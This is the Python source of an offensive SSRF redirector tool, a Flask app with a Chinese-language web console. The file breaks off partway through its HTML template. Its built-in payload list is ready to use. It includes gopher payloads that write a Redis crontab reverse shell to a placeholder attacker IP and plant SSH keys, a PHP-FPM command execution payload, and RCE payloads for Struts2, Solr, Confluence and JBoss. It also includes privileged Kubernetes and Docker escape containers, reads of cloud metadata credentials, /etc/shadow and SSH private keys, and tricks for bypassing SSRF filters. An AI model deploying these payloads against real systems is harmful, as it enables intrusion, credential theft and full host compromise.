#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF 30x Redirector - 终极无状态链式增强版 (云原生实战特化)
================================================
【实战集成】全HTTP方法支持 + K8s/Docker高危POST探测全自动化 + 无状态Base64链 + Gopher自动装填
+ 三大模块高级请求编辑：基础跳转 / 智能链 / 有状态链 均可自定义请求头与请求体
【本次优化】POST POC已包含完整请求体，选择POC后自动预加载Headers与Body，直接可用或修改
"""
from flask import Flask, request, redirect, render_template_string, jsonify, make_response, abort
import time
import uuid
import json
import base64
from datetime import datetime
from urllib.parse import quote_plus

app = Flask(__name__)
app.secret_key = str(uuid.uuid4())

# ==================== 配置 ====================
CONFIG = {
    'port': 5000,
    'host': '0.0.0.0',
    'max_logs': 1000,
    'default_status_code': 302,
    'access_token': None,
}

VALID_30X_CODES = {300, 301, 302, 303, 304, 305, 306, 307, 308}
SUPPORTED_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS', 'HEAD', 'CONNECT']

# ==================== 全局存储 ====================
LOGS = []
STATEFUL_CHAINS = {}
PATH_MAP = {}

# ==================== 内置实战 POC 列表 (大幅强化版 + 完整请求体) ====================
POC_LIST = [
    # ---------- 云元数据 ----------
    {'name': 'AWS 元数据 v1', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/latest/meta-data/', 'description': 'AWS EC2实例元数据服务'},
    {'name': 'AWS 元数据 v2 Token', 'category': '云元数据', 'method': 'PUT', 
     'payload': 'http://169.254.169.254/latest/api/token', 
     'description': 'IMDSv2 获取令牌 (需PUT)',
     'headers': {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}},
    {'name': 'AWS 元数据 IAM角色名', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'description': '列出IAM角色名'},
    {'name': '阿里云元数据探测', 'category': '云元数据', 'method': 'GET', 'payload': 'http://100.100.100.200/latest/meta-data/', 'description': '阿里云ECS元数据服务'},
    {'name': '阿里云 RAM 角色凭证', 'category': '云元数据', 'method': 'GET', 'payload': 'http://100.100.100.200/latest/meta-data/ram/security-credentials/', 'description': '获取RAM角色临时凭证名'},
    {'name': '腾讯云元数据探测', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.0.211/latest/meta-data/', 'description': '腾讯云CVM元数据服务'},
    {'name': 'Google Cloud 元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://metadata.google.internal/computeMetadata/v1/', 'description': 'GCP元数据(需Header)'},
    {'name': 'Azure 元数据 (2021)', 'category': '云元数据', 'method': 'GET', 
     'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 
     'description': 'Azure实例元数据 (需Header: Metadata:true)',
     'headers': {'Metadata': 'true'}},
    {'name': '华为云元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/openstack/latest/meta_data.json', 'description': '华为云/OpenStack 元数据'},
    {'name': 'OpenStack 元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/openstack', 'description': 'OpenStack 通用元数据端点'},

    # ---------- 高危端口/服务探测 ----------
    {'name': 'Redis 未授权探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:6379/info', 'description': 'dict协议探测Redis服务信息'},
    {'name': 'MySQL 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:3306/', 'description': '探测MySQL端口是否开放'},
    {'name': 'Memcached 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:11211/stats', 'description': '探测Memcached状态'},
    {'name': 'SSH 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:22/', 'description': '探测SSH服务'},
    {'name': 'Elasticsearch 9200 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:9200/', 'description': 'Elasticsearch HTTP接口'},
    {'name': 'Docker API 2375 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/version', 'description': 'Docker Remote API版本探测'},
    {'name': 'Kubelet 10250 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/metrics', 'description': 'Kubelet metrics接口 (需处理TLS)'},
    {'name': 'Zabbix 10051 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:10051/', 'description': 'Zabbix Server端口'},
    {'name': 'SMTP 25 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:25/', 'description': 'SMTP服务'},
    {'name': 'FTP 21 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:21/', 'description': 'FTP服务'},
    {'name': '内网 HTTP 代理探测 (8080)', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/', 'description': '常见Web应用端口'},

    # ---------- Gopher 攻击模板 ----------
    {'name': 'Gopher -> Redis 写计划任务反弹Shell (CentOS)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ap1%0d%0a$64%0d%0a%0d%0a*/1 * * * * bash -i >%26 /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>%261%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入crontab反弹shell (CentOS, 需替换占位符)'},
    {'name': 'Gopher -> Redis 写计划任务反弹Shell (Ubuntu/Debian)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$25%0d%0a/var/spool/cron/crontabs/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ap1%0d%0a$64%0d%0a%0d%0a*/1 * * * * bash -i >%26 /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>%261%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入crontab反弹shell (Ubuntu/Debian, 需替换占位符)'},
    {'name': 'Gopher -> Redis 写入SSH公钥 (需替换公钥)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$390%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAA... 请替换为你的SSH公钥 %0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入SSH公钥 (需替换占位符和公钥)'},
    {'name': 'Gopher -> FastCGI 代码执行 (PHP-FPM)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0f%10SCRIPT_FILENAME/var/www/html/index.php%01%04%00%01%00%00%00%00%01%05%00%01%00%18%04%00PHP_VALUEauto_prepend_file%20%3d%20php%3a//input%01%04%00%01%00%00%00%00%01%05%00%01%00%18%00%00%3C%3Fphp%20system(%27id%27)%3B%3F%3E',
     'description': '攻击PHP-FPM FastCGI执行系统命令 (需确认PHP文件路径)'},
    {'name': 'Gopher -> SMTP 发送邮件', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3a%20<admin@internal.com>%0d%0aRCPT%20TO%3a%20<attacker@external.com>%0d%0aDATA%0d%0aSubject%3a%20SSRF%20PenTest%0d%0a%0d%0aThis%20is%20a%20test%20email.%0d%0a.%0d%0aQUIT%0d%0a',
     'description': '利用SMTP发送邮件用于钓鱼/带外'},

    # ---------- 文件读取 ----------
    {'name': '读取 /etc/passwd', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/passwd', 'description': '读取Linux账户信息'},
    {'name': '读取 /etc/shadow (需root)', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/shadow', 'description': '尝试读取影子文件（需高权限）'},
    {'name': '读取 SSH 私钥', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///root/.ssh/id_rsa', 'description': '读取root SSH私钥'},
    {'name': '读取 K8s ServiceAccount Token', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///var/run/secrets/kubernetes.io/serviceaccount/token', 'description': 'Pod内SA Token文件'},
    {'name': '读取 /proc/self/environ', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///proc/self/environ', 'description': '环境变量可能包含敏感信息'},
    {'name': '读取 Windows 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///C:/Windows/System32/drivers/etc/hosts', 'description': 'Windows hosts文件'},
    {'name': '读取 Apache 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/apache2/sites-enabled/000-default.conf', 'description': 'Apache虚拟主机配置'},
    {'name': '读取 Nginx 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/nginx/nginx.conf', 'description': 'Nginx主配置文件'},
    {'name': '读取 Tomcat users.xml', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///usr/local/tomcat/conf/tomcat-users.xml', 'description': 'Tomcat管理用户密码'},
    {'name': '读取 应用源码 (常见路径)', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///var/www/html/config.php', 'description': 'PHP应用数据库配置'},
    {'name': 'Java netdoc协议读文件', 'category': '文件读取', 'method': 'GET', 'payload': 'netdoc:///etc/passwd', 'description': '利用Java netdoc协议读取文件'},

    # ---------- 内网漏洞利用 ----------
    {'name': 'Struts2 S2-032 RCE (id命令)', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8080/struts2-showcase/actionChain1.action?redirect:%24%7b%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b%27sh%27,%20%27-c%27,%20%27id%27%7d)).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char%5b50000%5d,%23c.read(%23d),%23out%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23out.getWriter().println(new%20java.lang.String(%23d)),%23out.close()%7d',
     'description': 'Struts2 S2-032远程代码执行 (GET方式, 可替换命令)'},
    {'name': 'Apache Solr 未授权 RCE (CVE-2017-12629)', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end',
     'description': 'Solr Velocity模板注入RCE'},
    {'name': 'JBoss JMX Console 未授权 RCE', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://<ATTACKER_IP>/shell.war',
     'description': 'JBoss未授权远程部署WAR (需搭建恶意war服务器)'},
    {'name': 'Confluence OGNL 注入 (CVE-2021-26084)', 'category': '内网漏洞利用', 'method': 'POST',
     'payload': 'http://127.0.0.1:8090/pages/createpage-entervariables.action',
     'description': 'Confluence OGNL注入RCE (POST方法)',
     'body': 'queryString=%5Cu0027%2b%7bClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027js%5Cu0027%29.eval%28%5Cu0027var+is%3dnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28java.lang.Runtime.getRuntime%28%29.exec%28%5Cu0027id%5Cu0027%29.getInputStream%28%29%29%29%3bvar+ss%3d%5Cu0027%5Cu0027%3bwhile%28%28line%3dis.readLine%28%29%29+!%3d+null%29+ss%2b%3dline%3b%5Cu0027%29%7d%2b%5Cu0027'},

    # ---------- K8s/容器 实战特化 ----------
    {'name': 'K8s API Server 探测', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api', 'description': '探测集群内网API Server'},
    {'name': 'K8s 创建恶意Pod (POST)', 'category': 'K8s 渗透', 'method': 'POST', 
     'payload': 'https://kubernetes.default.svc/api/v1/namespaces/default/pods', 
     'description': '尝试利用当前SA创建提权/逃逸Pod',
     'body': json.dumps({"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil-pod"},"spec":{"containers":[{"name":"evil","image":"busybox","command":["/bin/sh","-c","sleep 3600"],"securityContext":{"privileged":True},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}, indent=2)},
    {'name': 'K8s 提取Token (POST)', 'category': 'K8s 渗透', 'method': 'POST', 
     'payload': 'https://kubernetes.default.svc/api/v1/namespaces/kube-system/serviceaccounts/default/token', 
     'description': 'POST请求生成高权限SA的Token',
     'body': json.dumps({"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest"})},
    {'name': 'K8s 列举所有 Secrets', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api/v1/secrets', 'description': '列举集群中的Secrets（需权限）'},
    {'name': 'K8s 列举 Pods', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api/v1/pods', 'description': '列举所有Pod'},

    {'name': 'Kubelet 端口访问探测', 'category': 'Kubelet 渗透', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/pods', 'description': '探测Kubelet未授权访问'},
    {'name': 'Kubelet 执行系统命令 (POST)', 'category': 'Kubelet 渗透', 'method': 'POST', 
     'payload': 'https://127.0.0.1:10250/run/kube-system/kube-dns/dns', 
     'description': '通过Kubelet API无损命令执行(需替换命名空间/Pod名)',
     'body': '{"cmd": ["id"]}'},
    {'name': 'Kubelet exec (标准端点)', 'category': 'Kubelet 渗透', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/exec/kube-system/kube-dns/dns', 'description': 'Kubelet exec检查'},

    {'name': 'Docker 获取容器列表', 'category': 'Docker 渗透', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/containers/json', 'description': '探测Docker API版本及容器'},
    {'name': 'Docker 创建恶意容器 (POST)', 'category': 'Docker 渗透', 'method': 'POST', 
     'payload': 'http://127.0.0.1:2375/containers/create', 
     'description': '直接利用Docker API创建挂载特权目录的容器',
     'body': json.dumps({"Image": "busybox", "Cmd": ["/bin/sh", "-c", "sleep 3600"], "HostConfig": {"Binds": ["/:/mnt"]}}, indent=2)},
    {'name': 'Docker exec (websocket)', 'category': 'Docker 渗透', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/exec/container_id/start', 'description': 'Docker exec交互 (需容器ID)'},

    # ---------- 内网服务弱口令与未授权 ----------
    {'name': 'Tomcat Manager 登录', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/manager/html', 'description': 'Tomcat管理界面 (尝试弱口令)'},
    {'name': 'Jenkins Script Console (GET)', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/script', 'description': 'Jenkins脚本控制台 (未授权仍需POST执行Groovy)'},
    {'name': 'ActiveMQ 控制台 (默认未授权)', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8161/admin/', 'description': 'ActiveMQ管理界面'},
    {'name': 'Hadoop YARN ResourceManager', 'category': '内网未授权', 'method': 'POST', 
     'payload': 'http://127.0.0.1:8088/ws/v1/cluster/apps', 
     'description': 'Hadoop提交新应用 (可用于RCE)',
     'body': json.dumps({"application-id": "application_1234567890_0001", "application-name": "test", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"})},

    # ---------- 内网探测基础 ----------
    {'name': '内网 HTTP OPTIONS 探测', 'category': '内网探测', 'method': 'OPTIONS', 'payload': 'http://127.0.0.1:80/', 'description': '探测内网服务支持的方法'},
    {'name': '内网 HTTP TRACE 探测', 'category': '内网探测', 'method': 'TRACE', 'payload': 'http://127.0.0.1:8080/', 'description': '探测内网XST漏洞'},
    {'name': 'Redis dict协议探测', 'category': '内网探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:6379/INFO', 'description': 'dict协议探测Redis'},

    # ---------- SSRF 绕过技巧 ----------
    {'name': '十进制IP绕过 (127.0.0.1)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://2130706433/', 'description': '127.0.0.1的十进制表示'},
    {'name': '十六进制IP绕过', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://0x7f.0.0.1/', 'description': '127.0.0.1的十六进制形式'},
    {'name': 'IPv6映射绕过', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://[::ffff:127.0.0.1]/', 'description': 'IPv6映射的IPv4地址'},
    {'name': 'DNS重绑定域名 (localtest.me)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://localtest.me/', 'description': '解析到127.0.0.1的域名可用于绕过黑名单'},
    {'name': 'URL解析混淆 (userinfo部分)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://google.com@127.0.0.1/', 'description': '利用URL中@符号欺骗'},
]

# ==================== 工具函数 ====================
def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def log_request(extra_data=None):
    request_body = request.get_data().decode('utf-8', errors='replace')
    log_entry = {
        'id': str(uuid.uuid4())[:8],
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': get_client_ip(),
        'method': request.method,
        'path': request.path,
        'headers': dict(request.headers),
        'args': dict(request.args),
        'request_body': request_body[:500] + ('...' if len(request_body)>500 else ''),
        'redirect_url': None,
        'status_code': None,
        'response_headers': {},
        'response_body': '',
        'extra_data': extra_data or {}
    }
    LOGS.insert(0, log_entry)
    if len(LOGS) > CONFIG['max_logs']: LOGS.pop()
    return log_entry

def check_access_token():
    if CONFIG['access_token']:
        token = request.args.get('token') or request.headers.get('X-Access-Token')
        if token != CONFIG['access_token']: return False
    return True

# ==================== Web界面模板 ====================
INDEX_HTML = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF 30x Redirector 实战武装版</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { text-align: center; padding: 30px 0; border-bottom: 1px solid #333; margin-bottom: 30px; }
        .header h1 { color: #00ff88; font-size: 2.5em; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0, 255, 136, 0.3); }
        .header p { color: #888; font-size: 1.1em; }
        .grid { display: grid; grid-template-columns: 1.3fr 0.7fr; gap: 20px; margin-bottom: 30px; }
        .card { background: rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
        .card h2 { color: #00ff88; margin-bottom: 20px; font-size: 1.3em; display: flex; align-items: center; gap: 10px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #aaa; font-weight: 500; font-size: 14px; }
        .form-group select, .form-group input { width: 100%; padding: 12px 15px; background: rgba(0, 0, 0, 0.3); border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px; transition: all 0.3s; }
        .form-group select:focus, .form-group input:focus { outline: none; border-color: #00ff88; box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.1); }
        .btn { background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%); color: #000; border: none; padding: 14px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; width: auto; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0, 255, 136, 0.4); }
        .btn-secondary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; margin-bottom: 15px; width: auto;}
        .btn-warning { background: linear-gradient(135deg, #f6d365 0%, #fda085 100%); color: #000; margin-bottom: 15px; width: auto;}
        .btn-danger { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%); color: #fff; width: auto; padding: 6px 12px; font-size: 12px; }
        .btn-small { padding: 6px 12px; font-size: 12px; }
        .result-box { margin-top: 20px; padding: 15px; background: rgba(0, 0, 0, 0.4); border-radius: 8px; border-left: 4px solid #00ff88; display: none; }
        .result-box.show { display: block; }
        .payload-url { font-family: 'Courier New', monospace; word-break: break-all; padding: 10px; background: rgba(0, 0, 0, 0.5); border-radius: 4px; font-size: 13px; color: #ffd700; user-select: all; margin-bottom: 10px; }
        .copy-btn { padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; }
        .nav-tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .nav-tab { padding: 10px 20px; background: rgba(255, 255, 255, 0.05); border: none; border-radius: 8px; color: #888; cursor: pointer; transition: all 0.3s; }
        .nav-tab.active { background: #00ff88; color: #000; font-weight: 600; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .step-item { border-radius: 8px; padding: 15px; margin-bottom: 15px; transition: all 0.3s; }
        .step-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .step-title { font-weight: 600; }
        .step-form { display: grid; grid-template-columns: 100px 1fr; gap: 10px; align-items: center; }
        .step-input-group { display: flex; gap: 10px; width: 100%; }
        .protocol-tip { font-size: 13px; color: #888; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px; border-left: 3px solid #ffb8b8; margin-bottom: 15px;}
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-item { text-align: center; padding: 15px; background: rgba(0, 0, 0, 0.3); border-radius: 8px; }
        .stat-value { font-size: 2em; font-weight: 700; color: #00ff88; }
        .stat-label { color: #888; font-size: 12px; margin-top: 5px; }
        .logs-container { max-height: 700px; overflow-y: auto; }
        .log-entry { background: rgba(0, 0, 0, 0.3); border-radius: 8px; padding: 15px; margin-bottom: 10px; border-left: 3px solid #00ff88; font-size: 13px; cursor: pointer; transition: background 0.2s; position: relative; }
        .log-entry:hover { background: rgba(0, 0, 0, 0.5); }
        .log-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 8px; }
        .log-ip { color: #ff6b6b; font-weight: 600; }
        .log-detail { display: grid; grid-template-columns: 80px 1fr; gap: 5px; align-items: baseline; }
        .log-label { color: #888; }
        .log-value { color: #aaa; word-break: break-all; }
        .log-value.method { color: #00ff88; font-weight: 600; }
        .log-value.url { color: #ffd700; }
        .method-badge { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: 600; margin-right: 5px; background: #333; color: #fff;}
        .method-GET { background: #00ff88; color: #000; }
        .method-POST { background: #ff6b6b; color: #fff; }
        .method-OPTIONS { background: #f6d365; color: #000; }
        .method-PUT { background: #fda085; color: #000; }
        pre.log-pre { margin: 0; font-size: 11px; white-space: pre-wrap; word-break: break-word; max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; }
        .manual-refresh-btn { background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%); color: #fff; border: none; padding: 8px 18px; border-radius: 6px; font-size: 13px; cursor: pointer; transition: all 0.3s; }
        .manual-refresh-btn:hover { transform: translateY(-1px); box-shadow: 0 3px 10px rgba(116, 185, 255, 0.4); }
        .copy-raw-btn { background: rgba(0, 255, 136, 0.15); color: #00ff88; border: 1px solid #00ff88; padding: 2px 8px; border-radius: 4px; font-size: 11px; cursor: pointer; margin-left: 10px; transition: all 0.2s; }
        .copy-raw-btn:hover { background: rgba(0, 255, 136, 0.3); }
        .copy-raw-btn.copied { color: #f6d365; border-color: #f6d365; }
        .delete-log-btn { position: absolute; top: 8px; right: 8px; background: rgba(255, 107, 107, 0.2); color: #ff6b6b; border: none; border-radius: 50%; width: 22px; height: 22px; font-size: 14px; line-height: 1; cursor: pointer; display: none; align-items: center; justify-content: center; padding: 0; }
        .log-entry:hover .delete-log-btn { display: flex; }
        /* 高级请求编辑样式 */
        .req-editor { background: rgba(0,0,0,0.4); border: 1px solid #444; border-radius: 8px; padding: 15px; margin-top: 10px; }
        .req-editor label { font-size: 13px; color: #aaa; display: block; margin-bottom: 5px; }
        .req-editor input, .req-editor textarea, .req-editor select { width: 100%; padding: 8px; background: rgba(0,0,0,0.5); border: 1px solid #555; border-radius: 4px; color: #fff; margin-bottom: 8px; }
        .req-editor textarea { min-height: 80px; font-family: monospace; }
        .header-row { display: flex; gap: 5px; margin-bottom: 5px; }
        .header-row input { flex: 1; }
        .header-row button { flex: 0 0 auto; }
        .toggle-editor-btn { margin-top: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SSRF 30x Redirector 实战武装版</h1>
            <p>云原生穿透引擎 · K8s/Docker 307无损引流 · Gopher自动化 POST/PUT 封装 · 全局高级请求编辑</p>
        </div>
        <div class="stats">
            <div class="stat-item"><div class="stat-value" id="totalLogs">0</div><div class="stat-label">总访问记录</div></div>
            <div class="stat-item"><div class="stat-value" id="uniqueIPs">0</div><div class="stat-label">探测源(唯一IP)</div></div>
            <div class="stat-item"><div class="stat-value" id="pocCount">{{ poc_count }}</div><div class="stat-label">内置实战POC</div></div>
            <div class="stat-item"><div class="stat-value" style="color:#74b9ff;">∞</div><div class="stat-label">链式深度支持</div></div>
        </div>
        
        <div class="grid">
            <!-- 左侧：Payload生成器 -->
            <div class="card">
                <h2>⚡ Payload 构建控制台</h2>
                <div class="nav-tabs">
                    <button class="nav-tab active" data-tab="basic">🎯 基础单次跳转</button>
                    <button class="nav-tab" data-tab="stateless">🌟 云原生多维探测 (智能链)</button>
                    <button class="nav-tab" data-tab="stateful">🔒 有状态路径隐藏链</button>
                </div>
                
                <!-- 基础单次模式 -->
                <div id="tab-basic" class="tab-content active">
                    <div class="form-group">
                        <label>跳转响应码 (如需触发 K8s HTTPS 的 POST 请务必选 307)</label>
                        <select id="statusCode"></select>
                    </div>
                    <div class="form-group">
                        <label>快捷选择内置POC</label>
                        <select id="pocSelect"><option value="">-- 手动输入目标URL --</option></select>
                    </div>
                    <div class="form-group">
                        <label>最终目标URL (支持 dict/gopher/file 等)</label>
                        <input type="text" id="targetUrl" placeholder="例如: http://127.0.0.1/">
                    </div>
                    <button class="btn btn-warning btn-small toggle-editor-btn" onclick="toggleBasicEditor()">✏️ 高级请求编辑 (自定义Headers和Body)</button>
                    <div class="req-editor" id="basicReqEditor" style="display:none;">
                        <label>请求方法</label>
                        <select class="req-method">
                            <option value="GET">GET</option>
                            <option value="POST" selected>POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                            <option value="OPTIONS">OPTIONS</option>
                            <option value="HEAD">HEAD</option>
                            <option value="PATCH">PATCH</option>
                        </select>
                        <label>Host</label>
                        <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                        <label>路径</label>
                        <input type="text" class="req-path" placeholder="/api/v1/...">
                        <label>请求头 (点击下方添加)</label>
                        <div class="req-headers" id="basicReqHeaders"></div>
                        <button class="btn btn-secondary btn-small" onclick="addHeaderRow('basicReqHeaders')" style="margin-bottom:8px;">+ 添加请求头</button>
                        <label>请求体</label>
                        <textarea class="req-body" placeholder="支持JSON或其他任意格式内容"></textarea>
                        <button class="btn btn-small" style="margin-top:5px;" onclick="applyBasicCustomRequest()">✅ 应用并生成 Gopher Payload</button>
                    </div>
                    <button class="btn" onclick="generateBasicPayload()" style="margin-top:10px;">生成单跳 Payload</button>
                </div>

                <!-- 无状态链式模式 -->
                <div id="tab-stateless" class="tab-content">
                    <div class="protocol-tip">
                        💡 <b>云原生 POST 探测说明：</b><br>
                        当您选择诸如 K8s / Docker 恶意创建或越权执行（需POST发包）的内置 POC 时：<br>
                        1. 如果目标为 <b>HTTP</b> (如Docker): 您可以使用下方的「高级请求编辑」自由定制请求头和请求体，然后一键生成 <b>Gopher POST Payload</b>。<br>
                        2. 如果目标为 <b>HTTPS</b> (如K8s): Gopher不支持TLS，系统将自动调整状态码为 <b>307</b> 以反射请求方法，此时必须利用原生POST触发该跳板节点！(仍可编辑请求体供参考，但不会生成Gopher)
                    </div>
                    
